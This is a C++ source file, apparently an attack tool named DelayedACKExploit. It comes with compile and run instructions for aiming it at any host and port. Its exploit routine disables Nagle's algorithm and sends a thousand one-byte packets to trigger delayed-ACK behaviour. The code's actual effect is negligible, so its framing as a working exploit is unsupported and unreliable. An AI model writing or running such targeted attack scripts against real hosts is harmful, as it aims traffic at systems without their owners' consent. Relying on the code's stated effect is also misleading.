// Compile: g++ -o delayed_ack delayed_ack.cpp
// Run: ./delayed_ack <target_host> <port>
// No special privileges required

#include <iostream>
#include <cstring>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>

class DelayedACKExploit {
private:
    int sock;
    
public:
    bool connect(const std::string& host, int port) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) return false;
        
        struct hostent* server = gethostbyname(host.c_str());
        if (!server) return false;
        
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        memcpy(&addr.sin_addr.s_addr, server->h_addr, server->h_length);
        
        return ::connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0;
    }
    
    void exploit() {
        // Disable Nagle to force small packets
        int flag = 1;
        setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &flag, sizeof(flag));
        
        // Send many small packets to trigger delayed ACK
        for (int i = 0; i < 1000; i++) {
            send(sock, "A", 1, 0);
            usleep(1000);
        }
    }
    
    ~DelayedACKExploit() { if (sock >= 0) close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cerr << "Usage: " << argv[0] << " <host> <port>\n";
        return 1;
    }
    DelayedACKExploit exploit;
    if (exploit.connect(argv[1], atoi(argv[2]))) {
        exploit.exploit();
    }
    return 0;
}